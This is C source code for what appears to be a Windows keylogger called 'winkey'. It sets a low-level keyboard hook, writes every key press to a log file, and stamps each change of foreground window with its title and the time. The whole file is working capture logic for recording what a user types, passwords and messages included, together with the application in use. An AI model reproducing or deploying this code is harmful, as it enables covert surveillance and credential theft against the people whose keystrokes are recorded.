#include "winkey.h"

t_WinkeyState g_winkeyState = {0};

// Detects if the active window has changed
static BOOL HasWindowChanged(void)
{
    HWND currentWindow;

    currentWindow = GetForegroundWindow();
    if (currentWindow != g_winkeyState.lastWindow) {
        g_winkeyState.lastWindow = currentWindow;
        return TRUE;
    }
    return FALSE;
}

// Logs the information of the current active window
static void LogCurrentWindow(void)
{
    WCHAR wTitle[256];
    char windowTitle[512];
    time_t currentTime;
    struct tm timeInfo;

    if (!g_winkeyState.logFile)
        return;

    // Gets the window title in wide chars and converts to UTF-8
    if (!GetWindowTextW(g_winkeyState.lastWindow, wTitle, (int)(sizeof(wTitle)/sizeof(WCHAR)))) {
        strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
    } else {
        int bytes = WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, windowTitle, (int)sizeof(windowTitle), NULL, NULL);
        if (bytes <= 0)
            strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
    }

    // Gets timestamp and writes to log
    time(&currentTime);
    localtime_s(&timeInfo, &currentTime);

    fprintf(g_winkeyState.logFile, "\n\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\n",
            timeInfo.tm_mday, timeInfo.tm_mon + 1, timeInfo.tm_year + 1900,
            timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec, windowTitle);
    
    fflush(g_winkeyState.logFile);
}

// Logs a keystroke in the log file
static void LogKeyStroke(DWORD vkCode)
{
    const char *keyString;

    if (!g_winkeyState.logFile)
        return;

    // Check if active window changed
    if (HasWindowChanged()) {
        LogCurrentWindow();
    }

    // Converts virtual key code to readable text using ToUnicodeEx
    keyString = VkCodeToString(vkCode);
    if (keyString && strlen(keyString) > 0) {
        fprintf(g_winkeyState.logFile, "%s", keyString);
        fflush(g_winkeyState.logFile);
    }
}

// Low level keyboard hook callback
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT keyInfo;

    // Only process if code is valid and it's a key press
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        keyInfo = (PKBDLLHOOKSTRUCT)lParam;
        // Logs the pressed key
        LogKeyStroke(keyInfo->vkCode);
    }

    // Pass to next hook in the chain
    return CallNextHookEx(g_winkeyState.keyboardHook, nCode, wParam, lParam);
}